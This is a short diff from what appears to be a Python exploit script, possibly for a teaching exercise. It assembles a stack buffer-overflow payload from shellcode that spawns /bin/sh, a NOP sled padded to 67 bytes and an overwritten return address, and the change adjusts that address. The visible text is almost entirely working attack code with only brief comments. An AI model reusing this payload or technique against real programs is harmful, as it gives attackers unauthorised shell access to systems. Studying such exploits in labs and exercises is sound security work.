@@ -8,7 +8,7 @@ def run_shell():
 	assembler_password = '\xeb\x161\xc01\xc91\xd2[1\xff\x89\xdf\x83\xc7\x07\x89\x0f1\xc0\xb0\x0b\xcd\x80\xe8\xe5\xff\xff\xff/bin/sh@'
 	cmd = "pwd"# arbitrary, just used to follow the proper usage of the program
 	nop = '\x90' * (67 - len(assembler_password)) # add NOPs complete to exactly 67 bytes long password
-	shell_code_address = '\x69\xe0\xff\xbf' # Add begining of shell code address on stack, notic little endian
+	shell_code_address = '\xa9\xdf\xff\xbf' # Add begining of shell code address on stack, notic little endian
 	password = assembler_password + nop + shell_code_address
 	'''
 	using core analysis with gdb:
